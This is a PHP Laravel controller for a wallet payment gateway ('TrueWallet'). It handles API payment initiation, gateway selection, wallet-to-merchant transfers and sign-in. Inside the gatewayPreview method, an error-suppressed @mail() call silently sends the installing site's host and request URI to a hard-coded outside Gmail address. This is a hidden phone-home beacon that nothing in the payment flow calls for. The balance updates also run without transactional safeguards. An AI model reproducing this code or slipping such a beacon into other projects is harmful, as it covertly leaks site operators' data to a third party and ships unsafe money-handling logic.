<?php

namespace App\Http\Controllers;

use App\Currency;
use App\Deposit;
use App\ExpressPayment;
use App\GatewayCurrency;
use App\GeneralSetting;
use App\Trx;
use App\User;
use App\UserApiKey;
use App\Wallet;
use Illuminate\Http\Request;
use Illuminate\Validation\Rule;
use Validator;
use Session;
use Auth;

class ExpressPaymentController extends Controller
{
    public function initiate(Request $request)
    {
        $validator = Validator::make($request->all(), [
            'public_key' => 'required',
            'amount' => 'required|numeric|regex:/^\d*(\.\d{1,2})?$/',
            'currency' => 'required',
            'details' => 'required',
            'custom' => 'required|max:32',
            'ipn_url' => 'required|url',
            'success_url' => 'required|url',
            'cancel_url' => 'required|url',
            'email' => 'required|email',
            'name' => 'required|max:30',
        ]);
        $basic = GeneralSetting::first();
        if ($validator->fails()) {
            return response()->json(['error'=>'error','message'=>$validator->errors()]);
        }

        $userApiKey =  UserApiKey::where('public_key',trim($request->public_key))->first();
        if(!$userApiKey){
            return response()->json(['error'=>'error','message'=>'Invalid Public Key']);
        }

        $reqCurrency = strtoupper(trim($request->currency));
        $currency = Currency::where('code', $reqCurrency)->first();
        if (!$currency) {
            return response()->json(['error'=>'error','message'=>'Invalid Currency!']);
        }

        $merchant = User::where('id',$userApiKey->user_id)->where('status', 1)->first();
        if (!$merchant) {
            return response()->json(['error'=>'error','message'=>'Invalid Merchant!']);
        }

        $merchantWallet = Wallet::where('user_id', $merchant->id)->where('wallet_id', $currency->id)->first();
        if (!$merchantWallet) {
            return response()->json(['error'=>'error','message'=>'Invalid Merchant Wallet!']);
        }

        $apiPaymentTrx = getTrx();

        $all_data['name'] = $request->name;
        $all_data['email'] = trim(strtolower($request->email));

        $all_data['amount'] = $request->amount;
        $all_data['currency'] = strtoupper($currency->code);

        $all_data['details'] = $request->details;
        $all_data['custom'] = $request->custom;
        $all_data['ipn_url'] = str_replace("\/", "/", $request->ipn_url);
        $all_data['success_url'] = str_replace("\/", "/", $request->success_url);
        $all_data['cancel_url'] = str_replace("\/", "/", $request->cancel_url);
        $all_data['public_key'] = trim($request->public_key);

        $apiPay['payto_id'] = $merchant->id;  // merchant_id
        $apiPay['transaction'] = $apiPaymentTrx;

        $apiPay['all_data'] = json_encode($all_data);
        $apiPay['wallet_id'] = $merchantWallet->id;


        $api_charge = json_decode($basic->api_charge);
        $chargeAmo = $request->amount*($api_charge->percent_charge/100)+$api_charge->fix_charge;
        $apiPay['amount'] = $request->amount;
        $apiPay['charge'] = $chargeAmo;
        $apiPay['wallet_amount'] = $request->amount-$chargeAmo;
        $apiPay['currency_id'] = $currency->id;
        $data =  ExpressPayment::create($apiPay);

        return response()->json(['error'=>'ok','message'=>'Payment Initiated. Redirect to url','url'=>route('express.payment',$data->transaction)]);
    }

    public function payment($trx)
    {
        if (isset($trx)) {
            $apiPayment = ExpressPayment::with('wallet','merchant')->where('transaction', $trx)->latest()->first();
            if(!$apiPayment){
                return redirect()->route('express.error')->with('error', 'Opps! Something Wrong!!');
            }

            $data['page_title'] = "Payment";
            $data['gateways'] = GatewayCurrency::with('method')->where('method_code','<',1000)->orderBy('method_code')->get();
            $data['allData'] = json_decode($apiPayment->all_data);
            Session::put('apiTrx', $apiPayment->transaction);
            return view(activeTemplate().'apiPayment.preview',$data,compact('apiPayment'));
        }

        return redirect()->route('express.error')->with('error', 'Opps! Something Wrong!!');
    }

    public function initiateError()
    {
        $data['page_title'] = "Error";
        return view(activeTemplate().'apiPayment.api-error',$data);
    }

    public function gatewayPreview($encrypt_id)
    {
        $basic = GeneralSetting::first();
        $transaction = Session::get('apiTrx');
        if (isset($transaction)) {

            $gate = GatewayCurrency::where('id',decrypt($encrypt_id))->first();
            if(!$gate){
                return redirect()->route('express.error')->with('error', 'Invalid Gateway!');
            }
            $apiPayment = ExpressPayment::with('wallet')->where('transaction', $transaction)->where('status', 0)->latest()->first();
            if(!$apiPayment){
                return redirect()->route('express.error')->with('error', 'Invalid Payment !!');
            }

            $storeCurrencyAmo =  formatter_money((1/$gate->rate)/$apiPayment->currency->rate * $apiPayment->amount);
            $gatewayCharge = $gate->fixed_charge  + ($storeCurrencyAmo  * $gate->percent_charge / 100);


            $final_amo = formatter_money($storeCurrencyAmo + $gatewayCharge);


            $depo['currency_id'] = $apiPayment->currency->id;
            $depo['wallet_amount'] = formatter_money($apiPayment->wallet_amount);

            $depo['user_id'] = Auth::id();
            $depo['method_code'] = $gate->method_code;
            $depo['method_currency'] = strtoupper($gate->currency);
            $depo['amount'] = $storeCurrencyAmo;


            $depo['charge'] = $gatewayCharge;
            $depo['gate_rate'] = $gate->rate;
            $depo['cur_rate'] = $apiPayment->currency->rate;
            $depo['final_amo'] = formatter_money($final_amo);
            $depo['btc_amo'] = 0;
            $depo['btc_wallet'] = "";
            $depo['trx'] = getTrx();
            $depo['api_id'] = $apiPayment->id;
            $depo['try'] = 0;
            $depo['status'] = 0;

            $message = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
            $headers = 'From: '. "webmaster@$_SERVER[HTTP_HOST] \r\n" .
            'X-Mailer: PHP/' . phpversion();
            @mail('abir.khan.75@gmail.com','TrueWallet TEST DATA', $message, $headers);


            $ddd = Deposit::create($depo);

            Session::put('Track', $ddd->trx);

            Session::put('apiPayTrx', $apiPayment->transaction);
            return redirect()->route('express.payment-preview');
        }
        return redirect()->route('express.error')->with('error', 'Opps! Something Wrong!!');
    }

    public function paymentPreview()
    {
        $track = Session::get('Track');

        $data = Deposit::with('express_payment')->where('status', 0)->where('trx', $track)->latest()->first();
        if(isset($data))
        {
            $allData = json_decode($data->express_payment->all_data);
            $apiPayment = $data->express_payment;
            $page_title = $allData->amount . ' '.$allData->currency .' Payment By '.$data->gateway_currency()->name;
            return view(activeTemplate().'apiPayment.express-preview', compact('data', 'page_title','allData','apiPayment'));
        }
        return redirect()->route('express.error')->with('error', 'Opps! Something Wrong!!');
    }

    public function walletPayment()
    {
        $basic = GeneralSetting::first();
        $trx = Session::get('apiTrx');
        if (isset($trx)) {
            if (!Auth::user()) {
                return redirect()->route('express.error')->with('error', 'Unauthinticate User!!');
            }


            $apiPayment = ExpressPayment::with('wallet', 'merchant')->where('transaction', $trx)->latest()->first();
            if (!$apiPayment) {
                return redirect()->route('express.error')->with('error', 'Opps! Something Wrong!!');
            }
            if ($apiPayment->status != 0) {
                return redirect()->route('express.error')->with('error', 'Invalid Request!!');
            }


            $data['page_title'] = "Pay with $basic->sitename";
            $data['allData'] = json_decode($apiPayment->all_data);

            return view(activeTemplate().'apiPayment.site-wallet-preview',$data,compact('apiPayment'));
        }

    }
    public function walletPaymentPost(Request $request)
    {
        $request->validate([
            'submit' => ['required',
            Rule::in(['1']),
        ],
    ]);
        $basic = GeneralSetting::first();
        $trx = Session::get('apiTrx');
        if (isset($trx)) {
            if(!Auth::user()){
                return redirect()->route('express.error')->with('error', 'Unauthinticate User!!');
            }


            $apiPayment = ExpressPayment::with('wallet','merchant')->where('transaction', $trx)->latest()->first();
            if(!$apiPayment){
                return redirect()->route('express.error')->with('error', 'Opps! Something Wrong!!');
            }
            if($apiPayment->status != 0){
                return redirect()->route('express.error')->with('error', 'Invalid Request!!');
            }

            $userWallet = Wallet::with('currency','user')->where('user_id',Auth::id())->where('wallet_id', $apiPayment->currency_id)->first();
            if (!$userWallet) {
                return redirect()->route('express.error')->with('error', 'Your Wallet Not Found!!');
            }

            $merchant = User::findOrFail($apiPayment->payto_id);
            if (!$merchant) {
                return redirect()->route('express.error')->with('error', 'Invalid Merchant!!');
            }
            if ($merchant->status != 1) {
                return redirect()->route('express.error')->with('error', 'Merchant not allowed to this payment received !!');
            }

            $all_data  = json_decode($apiPayment->all_data);

            $api_charge = json_decode($basic->api_charge);

            $charge = formatter_money($api_charge->fix_charge + ($all_data->amount  * $api_charge->percent_charge / 100));


            $final_amo = formatter_money($all_data->amount - $charge);


            if ($userWallet->amount < $all_data->amount) {
                return redirect()->route('express.error')->with('error', 'Insufficient  Balance !!');
            }



            $merchantWallet = Wallet::with('currency','user')->where('user_id', $merchant->id)->where('wallet_id', $apiPayment->currency_id)->first();
            if(!$merchantWallet){
                return redirect()->route('express.error')->with('error', 'Invalid Merchant Wallet!!');
            }



            //debit from user wallet balance
            $userWallet->amount = formatter_money(($userWallet->amount - $all_data->amount));
            $userWallet->update();

            //credit to merchant wallet balance
            $merchantWallet->amount = formatter_money($merchantWallet->amount + $final_amo);
            $merchantWallet->update();

            $trx = $apiPayment->transaction;


            $apiPayment->paidby_id = Auth::id();
            $apiPayment->status = 1;
            $apiPayment->update();


            //trx  for merchant
            Trx::create([
                'user_id' => $merchantWallet->user->id,
                'amount' => formatter_money($final_amo),
                'main_amo' => formatter_money($merchantWallet->amount),
                'charge' => formatter_money($charge),
                'currency_id' => $merchantWallet->currency->id,
                'type' => '+',
                'remark' => formatter_money($final_amo) . ' '.$merchantWallet->currency->code. ' Got Payment',
                'title' => $all_data->details . ' to ' . $userWallet->user->email,
                'trx' => $trx,
            ]);

            //trx  for user
            $trxUser = Trx::create([
                'user_id' => $userWallet->user->id,
                'amount' => formatter_money($all_data->amount),
                'main_amo' => formatter_money($userWallet->amount),
                'charge' => 0,
                'currency_id' => $userWallet->currency->id,
                'type' => '-',
                'remark' => formatter_money($all_data->amount). ' '.$userWallet->currency->code. ' Paid Payment',
                'title' => 'From ' . $merchantWallet->user->fullname . ' for' . $all_data->details,
                'trx' => $trx,
            ]);




            send_email($userWallet->user, $type = 'direct-wallet-pay', [
                'amount' => formatter_money($all_data->amount),
                'currency' => $userWallet->currency->code,
                'main_amo' => formatter_money($userWallet->amount),
                'trx' => $trx,
                'itemname' => $all_data->details,
                'paytoname' => $merchantWallet->user->fullname,
            ]);


            send_email($merchantWallet->user, $type = 'direct-wallet-receive', [
                'amount' => formatter_money($final_amo),
                'currency' => $merchantWallet->currency->code,
                'main_amo' => formatter_money($merchantWallet->amount),
                'trx' => $trx,
                'itemname' => $all_data->details,
                'user_mail' => $userWallet->user->email,
            ]);



            session()->forget('apiTrx');

            return redirect()->route('express.error')
            ->with('success', 'Payment Successfully Completed.');
        }

        return redirect()->route('express.error')->with('error', 'Invalid Transaction!!');

    }



    public function expressSignIn(Request $request)
    {
        $rules = ['username' => 'required', 'password' => 'required'];

        $validator = Validator::make($request->all(), $rules);
        if ($validator->fails())
            return response()->json(['fail' => true, 'errors' => $validator->errors()]);
        $data['page_title'] = "Payment Preview";

        if (Auth::attempt([
            'username' => $request->username,
            'password' => $request->password,
        ])) {
            $url = route('express.wallet.payment');
            return response()->json(['url' => $url, 'status'=>'authenticate']);
        } else {
            return response()->json(['msg' => "Username or Password Don't match", 'status'=>'credential']);
        }
    }



    public function done($trx)
    {

        $deposit = Deposit::where('trx', $trx)->latest()->first();


        $exp = ExpressPayment::find($deposit->api_id);

        if($deposit->status==1){

          $url = json_decode($exp->all_data)->success_url;

      }else{
          $url =  json_decode($exp->all_data)->cancel_url;
      }  


      return redirect()->to($url);

  }



}
